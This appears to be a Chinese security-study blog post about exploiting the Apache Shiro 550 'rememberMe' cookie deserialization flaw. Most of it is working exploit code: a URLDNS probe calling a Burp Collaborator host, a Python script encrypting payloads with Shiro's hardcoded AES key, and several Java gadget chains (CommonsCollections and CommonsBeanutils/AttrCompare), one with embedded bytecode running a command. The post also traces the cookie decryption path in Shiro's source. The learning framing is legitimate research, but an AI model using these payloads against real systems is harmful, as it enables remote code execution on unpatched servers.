---
title: shiro
date: 2022-03-19 18:02:18
tags:
      - shiro
      - java
---

### shiro550反序列化学习<!--more-->

首先idea导入shiro自带的`shiro\samples\web`maven项目，快速搭建一个shiro项目

分析其中包含的依赖（使用maven helper插件），只有runtime和compile的依赖会在项目运行时存在于项目中，其他test的则无法访问到

![image-20220319180339512](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220319180339512.png)

![image-20220319180428213](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220319180428213.png)

所以一般情况下commons-collections中的链无法利用

使用URLDNS序列化后再编码传入进行测试

```java
public static void main(String[] args) throws Exception {
        HashMap<URL, Integer> hashMap=new HashMap<>();
        URL url=new URL("http://9w6ma81q22bbdpbdg2t2ecbiu90zoo.burpcollaborator.net");

        Class<? extends URL> urlClass = url.getClass();
        Field hashCode = urlClass.getDeclaredField("hashCode");
        hashCode.setAccessible(true);
        hashCode.set(url,1234);
        hashMap.put(url,1);
        hashCode.set(url,-1);
        SerializeTest.serialize(hashMap);
    }
```

##### 加密脚本

shiro该版本中AES加密秘钥是固定的

![image-20220319203412860](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220319203412860.png)

```python
import sys
from random import random
import base64
import uuid
from Crypto.Cipher import AES

def get_file_data(filename):
    with open(filename, "rb") as f:
        data = f.read()
        return data


def aes_enc(data):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    #iv是初始向量
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))
    return ciphertext


def aes_dec(enc_data):
    enc_data = base64.b64decode(enc_data)
    unpad = lambda s: s[:-s[-1]]
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = enc_data[:16]
    enctyptor = AES.new(base64.b64decode(key), mode, iv)
    plaintext = enctyptor.decrypt(enc_data[16:])
    # plaintext=bytes.decode(plaintext)
    plaintext = unpad(plaintext)
    return plaintext


if __name__ == '__main__':
    data = get_file_data("C:\\Temp\\test.bin")
    print(aes_enc(data))

```

### CC依赖如果存在

先导入maven依赖

```xml
<dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
```

##### payload

```java
//cc3+cc2+cc6缝合,不能用数组
    //原因:首先,cc6不受jdk版本限制,接着cc2不需要数组,如果使用Runtime.exec()就必须使用Transformr数组
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates=new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"aaa");
        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        /*byte[] code= Files.readAllBytes(Paths.get("H:\\java\\classTest\\MyClass.class"));*/
        byte[] code= Base64.getDecoder().decode("yv66vgAAADQANQoACwAaCgAbABwIAB0KABsAHgcAHwoABQAgCQAhACIIACMKACQAJQcAJgcAJwEA" +
                "Bjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAl0cmFuc2Zvcm0BAHIoTGNv" +
                "bS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9h" +
                "cGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAApF" +
                "eGNlcHRpb25zBwAoAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMv" +
                "RE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7" +
                "TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9u" +
                "SGFuZGxlcjspVgEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAHwEAClNvdXJjZUZpbGUBAAxN" +
                "eUNsYXNzLmphdmEMAAwADQcAKQwAKgArAQAEY2FsYwwALAAtAQATamF2YS9pby9JT0V4Y2VwdGlv" +
                "bgwALgANBwAvDAAwADEBACVsYW9kIHN1Y2Nlc3MhISEhISEhISEhISEhISEhISEhISEhISEhBwAy" +
                "DAAzADQBAAdNeUNsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRj" +
                "L3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRl" +
                "cm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVu" +
                "dGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7" +
                "KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UBABBqYXZhL2xhbmcvU3lzdGVt" +
                "AQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3By" +
                "aW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAKAAsAAAAAAAQAAQAMAA0AAQAOAAAAHQAB" +
                "AAEAAAAFKrcAAbEAAAABAA8AAAAGAAEAAAAIAAEAEAARAAIADgAAABkAAAADAAAAAbEAAAABAA8A" +
                "AAAGAAEAAAAYABIAAAAEAAEAEwABABAAFAACAA4AAAAZAAAABAAAAAGxAAAAAQAPAAAABgABAAAA" +
                "HQASAAAABAABABMACAAVAA0AAQAOAAAAWwACAAEAAAAauAACEgO2AARLpwAISyq2AAayAAcSCLYA" +
                "CbEAAQAAAAkADAAFAAIADwAAABoABgAAAAwACQAPAAwADQANAA4AEQARABkAEwAWAAAABwACTAcA" +
                "FwQAAQAYAAAAAgAZ");
        byte[][] codes={code};
        bytecodes.set(templates,codes);

        InvokerTransformer invokerTransformer=new InvokerTransformer("newTransformer",null,null);

        HashMap<Object,Object> map= new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));
        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,templates);

        HashMap<Object,Object> map2=new HashMap<>();
        map2.put(tiedMapEntry,"bbb");
        lazyMap.remove(templates);
        //防止在序列化hashCode的时候触发
        Class<LazyMap> lazyMapClass = LazyMap.class;
        Field factory = lazyMapClass.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazyMap,invokerTransformer);
        serialize(map2);

        //HashMap.readObject()->TiedMapEntry.get()-->LazyMap.get()-->invokerTransformer

```



#### cookie反序列化流程分析

首先,在idea中通过双击`shift`查找关键字,cookie有关的类,找到一个`CookieRememberMeManager`类

![image-20220319234114164](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220319234114164.png)

其中有一个`getRemeberedSerializedIdentity`方法,它的作用是获取cookie中的base64解码后的bytes,调用它的是`getRememberedPrincipals`方法

![image-20220319235731776](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220319235731776.png)

先获得base64解码后的bytes,然后再调用convertBytesToPrincipals方法,它里面再调用decrypt进行解码

![image-20220320001010886](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220320001010886.png)

![image-20220320001030875](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220320001030875.png)

再调用cipherService接口的decrypt进行解密,解密后得到序列化字符串的bytes

然后对其调用`deserialize`进行反序列化

![image-20220320001504004](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220320001504110.png)

ois.readObject会调用`resolveClass`方法

这里需要注意的是Shiro并不是使用原生的反序列化，而是重写了ObjectInputStream,重写后的resolveClass方法最终调用的可以理解为findClass去加载类,而findClass是加载不了数组类的

![image-20220320003813486](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220320003813486.png)

#### 为什么findClass加载不了数组类?

> 看了讲解,由于java底层知识严重不足,只能勉强理解成如下

findClass实质是将包名的路径更换成文件路径去调用defineClass去加载,而不会有class文件起数组的名字

如果是jdk自带的数组类,是可以加载的它调用的是Class.forName,

shiro中如果是网站下面的比如`WEBINF`下面的就会调用findClass去加载



### Shiro无依赖

Shiro默认是没有CC依赖的,此时怎么通过反序列化开始代码执行呢?

Shiro默认有一个Commons-beanutils依赖,这个依赖中

Commons-beanutils依赖中有一个叫`PropertyUtils`的类,它有一个`getProperty`函数,能够通过传入的对象动态的调用其get方法

`getProperty`最后会调用到``PropertyUtilsBean`的`getSimpleProperty`方法,

descriptor中包含属性值和其get set方法的名字,然后在invokeMethod中进行调用

![image-20220321143032661](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220321143032661.png)

恰好`TemplatesImpl`中有一个叫做`getOutputProperties()`的无参方法,它调用了cc3中需要调用的`newTransformer`方法

![image-20220321143749765](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220321143749765.png)

试一下能不能调用,要注意大小写,get方法采用的是驼峰命名方法

```java
public static void main(String[] args) throws Exception{
        TemplatesImpl templates=new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"aaa");
        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code= Files.readAllBytes(Paths.get("H:\\java\\classTest\\MyClass.class"));
        byte[][] codes={code};
        bytecodes.set(templates,codes);
        
        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());
        PropertyUtils.getProperty(templates,"outputProperties");

    }
```

成功弹出计算器



在`BeanComparator`中的`compare`方法中有调用getProperty

![image-20220321144513243](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220321144513243.png)

从这里开始就和CC2前半部分一样了,通过`PriorityQueue`类的`readObject`会调用到`compare`方法,

但是BeanComparator有个问题

> 意外发现

但是我在偶然的尝试中发现初始化的时候传入`Beancomparator`,只需要在反射之后再次设置`comparator`参数为`beanComparator`,还是能继续触发,但是这个时候队列add的时候需要第二个是templates,而不是第一个是templates,完事自己探究一下

![image-20220321225636931](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220321225636931.png)





因为Integer里面没有`getOutputProperties`方法,所以会报错,在初始化优先队列的时候传入一个之前CC2中用的`transformingComparator`,,等到add完成之后再通过反射修改`comparator`参数为`beanComparator`

这里就有一个比较重要的思想,就是本地构造类的时候包和目标机器不一致是可以的,只要保证序列化进去的时候修改掉就行

payload

```java
TemplatesImpl templates=new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"aaa");
        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code= Files.readAllBytes(Paths.get("H:\\java\\classTest\\MyClass.class"));
        byte[][] codes={code};
        bytecodes.set(templates,codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());
        BeanComparator beanComparator = new BeanComparator("outputProperties");

        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));

        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(1);
        Class<? extends PriorityQueue> priorityQueueClass = priorityQueue.getClass();
        Field declaredField = priorityQueueClass.getDeclaredField("comparator");
        declaredField.setAccessible(true);
        declaredField.set(priorityQueue,beanComparator);

        serialize(priorityQueue);
```

加密编码后尝试,发现服务端报了这样一个错误,为什么Commons-utils会去加载CC里面的类呢

![image-20220321231216837](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220321231216837.png)

原因是BeanComparator方法的初始化方法调用了`ComparableComparator.getInstance()`

![image-20220321231636548](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220321231636548.png)

不过它还有另一个构造方法,可以自己传入一个满足要求的`Comparator`,这个Comparator需要满足两点:1.在shiro默认依赖中或者jdk中存在2.由于需要反序列化,所以需要继承`Serializeable`接口还有`Comparator`接口

做一个脚本,先通过idea找到继承了接口的类,然后复制黏贴到txt文件中(先把依赖整对,别把别的依赖里面的类搞进去了)

```java
with open (r"C:\Users\MSI\Desktop\test\Serializeable.txt") as f:
    data=f.readline()
    sers=[]
    while data:
        sers.append(data)
        data=f.readline()
with open (r"C:\Users\MSI\Desktop\test\Comparator.txt") as c:
    data=c.readline()
    coms=[]
    while data:
        coms.append(data)
        data=c.readline()
for i in sers:
    if(i in coms):
        print(i)
```

![image-20220321234935305](https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220321234935305.png)

找到了如上这些满足条件的类,第一个`AttrCompare`就很好用,它只有默认的无参构造方法

尝试后成功

##### 最终payload

```java
public static void main(String[] args) throws Exception{
        TemplatesImpl templates=new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"aaa");
        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code= Files.readAllBytes(Paths.get("H:\\java\\classTest\\MyClass.class"));
        byte[][] codes={code};
        bytecodes.set(templates,codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());
        BeanComparator beanComparator = new BeanComparator("outputProperties",new AttrCompare());

        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));

        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(1);
        Class<? extends PriorityQueue> priorityQueueClass = priorityQueue.getClass();
        Field declaredField = priorityQueueClass.getDeclaredField("comparator");
        declaredField.setAccessible(true);
        declaredField.set(priorityQueue,beanComparator);

        serialize(priorityQueue);
        unserialize("C:\\Temp\\test.bin");


    }
```



